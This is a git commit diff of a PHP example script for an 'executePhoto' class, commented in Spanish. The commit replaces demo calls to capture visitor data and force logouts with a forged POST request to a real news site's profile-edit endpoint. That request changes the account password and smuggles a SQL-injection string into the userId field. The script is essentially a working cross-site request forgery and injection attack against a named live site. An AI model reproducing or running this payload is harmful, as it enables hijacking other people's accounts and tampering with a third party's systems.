c68d1c5cc856c7f73af155740741b9d54eabb4f9
David Martin Cervero <mcdave91@gmail.com>
2013-05-23 15:04:30 +0200

    no message

--- example.php
+++ example.php
@@ -1,22 +1,24 @@
 <?php
 	require('class.executePhoto.php');
 
-	// Capturamos los datos de la conexión:
-	executePhoto::save_client();
-
-	// Imprimimos una imagen remota:
-	executePhoto::print_img('http://foro.elhacker.net/Themes/converted/selogo.jpg');
-
-	// Imprimimos un PDF:
-	executePhoto::print_pdf('http://www.boe.es/boe/dias/2013/02/04/pdfs/BOE-A-2013-1145.pdf');
-
 	// Ejemplo de ejecución arbitraria cambio contraseña:
- 	$param = array('contraseña'  		=> '123456',
-			'repetir_contraseña'	=> '123456',
-			'email' 		=> 'ejemplo@email.com');
+ 	$param = array('avatar'  		=> '',
+ 				   'bornDateYear'  	=> '',
+ 				   'ediAddress'  	=> '',
+ 				   'ediBio'  		=> '',
+ 				   'ediCountryCode' => 'ES',
+ 				   'ediProvince'  	=> '',
+ 				   'ediCity'  		=> '',
+ 				   'ediURL'  		=> '',
+ 				   'ediZipCode'  	=> '',
+ 				   'name'  			=> 'David',
+ 				   'newsletter'  	=> '',
+ 				   'newsletters'  	=> '',
+ 				   'password'  		=> '123456',
+ 				   'repeatpassword' => '123456',
+ 				   'sex'  			=> '',
+				   'surname'		=> 'Martin',
+				   'userId'			=> '29307\' and \'1\'=\'1');
 
-	executePhoto::redirect_post('http://localhost/', $param);
-
-	// Redireccionamos la web y desconectamos a X usuario de la web:
-	executePhoto::redirect('http://localhost/logout');
+	executePhoto::redirect_post('https://seguro.eldiario.es/usuarios/editar-perfil.json', $param);
 ?>
